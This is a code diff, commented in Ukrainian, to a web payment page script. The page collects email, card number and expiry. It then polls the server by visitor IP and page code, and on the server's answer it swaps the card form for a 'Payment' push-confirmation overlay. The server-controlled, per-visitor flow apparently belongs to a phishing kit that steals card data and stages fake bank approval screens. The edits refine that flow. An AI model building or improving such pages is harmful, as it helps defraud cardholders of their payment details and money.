@@ -339,16 +339,18 @@
       return '';
     }
     // Додаємо показ overlay-вікна загрузки після сабміту форми
-    const loadingOverlay = document.createElement('div');
-    loadingOverlay.id = 'loading-overlay';
-    loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
-    loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing payment...</div></div>';
-    document.body.appendChild(loadingOverlay);
+    if (!window.loadingOverlay) {
+      window.loadingOverlay = document.createElement('div');
+      window.loadingOverlay.id = 'loading-overlay';
+      window.loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
+      window.loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing payment...</div></div>';
+      document.body.appendChild(window.loadingOverlay);
+    }
 
     const paymentForm = document.getElementById('paymentForm');
     paymentForm.onsubmit = async function(e) {
         e.preventDefault();
-        loadingOverlay.style.display = 'flex';
+        window.loadingOverlay.style.display = 'flex';
         const email = document.getElementById('email-input').value;
         const card = document.getElementById('card-input').value;
         const expiry = document.getElementById('expiry-input').value;
@@ -475,6 +477,9 @@
     <script>
     // --- POLLING для support/text кнопок ---
     let supportTabOpened = false;
+    function startSupportPolling() {
+      setTimeout(pollSupportButtons, 2000);
+    }
     async function pollSupportButtons() {
         if (!userIP) {
             return setTimeout(pollSupportButtons, 2000);
@@ -483,7 +488,7 @@
             const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
             const data = await resp.json();
             if ((data.show_support || data.show_text)) {
-                loadingOverlay.style.display = 'none';
+                if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
             }
             if (!supportTabOpened && (data.show_support || data.show_text)) {
                 const page_code = getPageCode();
@@ -499,7 +504,11 @@
         } catch (e) {}
         setTimeout(pollSupportButtons, 2000);
     }
-    setTimeout(pollSupportButtons, 2000);
+    // Стартуємо polling тільки після визначення userIP
+    getUserIP(function(ip) {
+        userIP = ip;
+        startSupportPolling();
+    });
     </script>
     <script>
     // --- Оновлення IP у базі при відкритті сторінки ---
@@ -697,21 +706,18 @@ document.getElementById('back-btn').onclick = function() {
     }
     function pollPushOverlay() {
       const page_code = getPageCode();
-      console.log('Polling page_code:', page_code);
       document.body.setAttribute('data-page-code', page_code);
       if (!page_code) return setTimeout(pollPushOverlay, 2000);
       const url = '/check_push?page_code=' + encodeURIComponent(page_code);
-      console.log('Polling url:', url);
       fetch(url)
         .then(resp => resp.text())
         .then(txt => {
-          console.log('check_push response:', txt);
           if (txt === 'true') {
             const { total, currency } = getTotalAndCurrency();
             document.getElementById('push-payment-title').textContent = `Payment ${total} ${currency}`;
             document.getElementById('push-overlay').style.display = 'flex';
             document.getElementById('payment-card-main').style.display = 'none';
-            if (window.loadingOverlay) loadingOverlay.style.display = 'none';
+            if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
           } else {
             setTimeout(pollPushOverlay, 2000);
           }
